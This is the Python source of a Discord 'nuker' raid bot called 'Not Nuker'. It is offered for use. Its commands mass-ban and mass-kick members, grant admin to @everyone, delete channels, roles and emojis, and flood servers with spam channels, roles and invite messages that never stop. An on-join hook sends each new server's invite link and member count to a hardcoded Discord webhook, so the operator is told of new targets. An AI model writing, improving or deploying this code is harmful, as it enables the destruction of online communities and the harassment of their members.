#Installing Modules & Supporting Codes

import discord
from discord.ext import commands
import asyncio
import requests
import sys
import colorama
from colorama import Fore ,init ,Style ,Back
import json
from discord.ext import commands
import os
import random 
import time
from discord import Webhook, AsyncWebhookAdapter
from discord import Permissions
from webserver import keep_alive

#Logging & Customizing

config = r"nnconfig.json"

with open("nnconfig.json") as f:
    config = json.load(f)
prefix = config.get("Prefix")

keep_alive()
client = commands.Bot(
    command_prefix=prefix, 
    intents=discord.Intents.all(),
    help_command=None
)
CHANNEL_NAMES = ['Not Nuker', 'raided']
MESSAGE_CONTENTS = ["@everyone **nuked by not nuker join https://discord.gg/n4SbZXVUjY**"]
WEBHOOK_NAMES = ['Raid Bot', 'Nuke Bot', 'Wizz Bot']

#Commands & Codes (BEGINNING)

client.remove_command('help')




@client.command()
async def masskick(ctx):
    for member in ctx.guild.members:
        if member == client.user:
            continue
        try:
            await member.kick()
        except discord.Forbidden:
            print(
                f"{member.name} has FAILED to be kicked from {ctx.guild.name}")
        else:
            print(f"{member.name} has been kicked from {ctx.guild.name}")
    print("kicked all")



@client.command()
async def massban(ctx):
  
    for member in ctx.guild.members:
        if member == client.user:
            continue
        try:
            await member.ban()
        except discord.Forbidden:
            print(
                f"{member.name} has FAILED to be banned from {ctx.guild.name}")
        else:
            print(f"{member.name} has been kicked from {ctx.guild.name}")
    print("Banned all")



@client.command()
async def banall(ctx):
        await ctx.message.delete()
        for member in ctx.guild.members:
         if member.id != 853262928455008287: #Paste Your ID
          for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (Fore.BLUE + f"{user.name} Was Banned")
            except:
                pass

@client.command()
async def dmall(ctx, *, message:str):
  await ctx.message.delete()
  for channel in client.private_channels:
    try:
      await channel.send(f"{message}")
      print(Fore.BLUE + f"Message Sent In {channel}")
    except:
      print(Fore.RED + f"Failed To Send Message In {channel}")

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)

@client.command()
@commands.is_owner()
async def restart(ctx):
    await ctx.message.delete()
    message = await ctx.send("Restarting... The Bot")
    restart_program()
    
@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print(Fore.BLUE + "@everyone Has Admin Now!") 
                  except:
                      print(Fore.BLUE + "Failed To Give Admin To @everyone")
                      
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= f"{prefix}help NOT NUKER ON TOP"))
  
  print(Fore.LIGHTRED_EX + f'''
        A SHIT NOTNUKER RUNNINGR AGIAN
{prefix}help - To Start Nuking\n
Logged In As {client.user}\n
Made By: NOT NUKER\n
''')

time.sleep(3)

print(Fore.LIGHTRED_EX + """
██████╗░██╗░██████╗░█████╗░░█████╗░██████╗░██████╗░
██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██║░░██║██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝██║░░██║
██║░░██║██║░╚═══██╗██║░░██╗██║░░██║██╔══██╗██║░░██║
██████╔╝██║██████╔╝╚█████╔╝╚█████╔╝██║░░██║██████╔╝
╚═════╝░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░

███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
      
 __  _  __ _____   __  _ _  _ _  _____ ___  
|  \| |/__\_   _| |  \| | || | |/ / __| _ \ 
| | ' | \/ || |   | | ' | \/ |   <| _|| v / 
|_|\__|\__/ |_|   |_|\__|\__/|_|\_\___|_|_\ 

      
      
 """)


@client.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)
    print(f"spam cmd done")


@client.command(pass_context=True)
async def name(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)

@client.command(pass_context=True)
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (Fore.BLUE + f"{emoji.name} Emoji Has Been Deleted")
            except:
                print (Fore.RED + f"{emoji.name} Emoji Was Failed To Be Deleted")

@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"NUKED")
      print(Fore.BLUE + "Created Roles")
    except:
        print(Fore.RED + "Failed To Create Roles")


  
@client.command()
async def nuke(ctx, amount=50):
  await ctx.guild.edit(name="Shit Server NN ON OP💩")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(Fore.BLUE + channel.name + " Channel Was Wizzed")
    except:
        pass
        print (Fore.RED + channel.name + " Channel Was Failed To Wizz")
        guild = ctx.message.guild
  for i in range(amount):
    try:  
      await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
      print(Fore.CYAN + f"[ {i} ] Channels Made")
    except:
      print(Fore.RED + "Failed To Create Channels")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(Fore.GREEN + f"{role.name} Role Was Deleted!")

    except:
      print(Fore.RED + f"Failed To Delete {role.name} Role")
  await asyncio.sleep(0.1)
  for i in range(100):  
    for i in range(1500):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(MESSAGE_CONTENTS)
        )
          print(Fore.BLUE + f"{channel.name} Channel Was Spammed")
        except:
          print(Fore.RED + f"Failed To Spam {channel.name} Channel")
    for member in ctx.guild.members:
      if member.id != 853262928455008287: #Your ID Here
        try:
          await member.ban(reason="Revenge Taken 😏 😈")
          print(Fore.BLUE + f"{member.name} Member Was Banned")
        except:
          print(Fore.RED + f"Failed To Ban {member.name} Member")  

        
@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
  while True:  
    await channel.send(random.choice(MESSAGE_CONTENTS))
    await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))



@client.command()
async def kick(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="We Will Be Back AGAIN 😈")
      print(Fore.BLUE + member.name + "Member Was Kicked")
    except:
      print(Fore.RED + member.name + "Was Failed To Be Kicked")

@client.command(name='help')
async def help(ctx):
    embed = discord.Embed(title='Welcome to Not Nuker Update V10',
                          description='Not Nuker Commands',
                          color=discord.Color.purple())
    embed.add_field(name=';rolespam', value='Spams Roles')
    embed.add_field(name=';name', value=';name lmao -- chages server name')
    embed.add_field(name=';nuke', value='Begins nuking the server')
    embed.add_field(name=';admin', value='gives u admin to the server')
    embed.add_field(name=';spam', value='USAGE: ;spam 100 text of spam')
    embed.add_field(name=';help', value='shows this message')
    embed.add_field(name=';masskick', value='Kicks All')
    embed.add_field(name=';massban', value='Fast Ban')
    embed.add_field(name=';banall', value='Slow Ban Enjoy Seeing All Getting Baned')
    await ctx.send(embed=embed)

  #webhook hit message
@client.event 
async def on_guild_join(guild):
	z = random.choice(guild.text_channels)
	invitelink = await z.create_invite(max_uses=0, unique=True)
	await requests.post(f'https://discord.com/api/webhooks/1000044748184227940/BY-gG-BPFGF_f1jnhXTwwCncvXbjVo76EAaIN3dQCfAXOAwYrt5I_hz1NFCVgrYrJag5', data={'content':f"**New Server Nuke** : {invitelink}            **members** : {guild.member_count}"}
	)

client.run(NOTNUKER)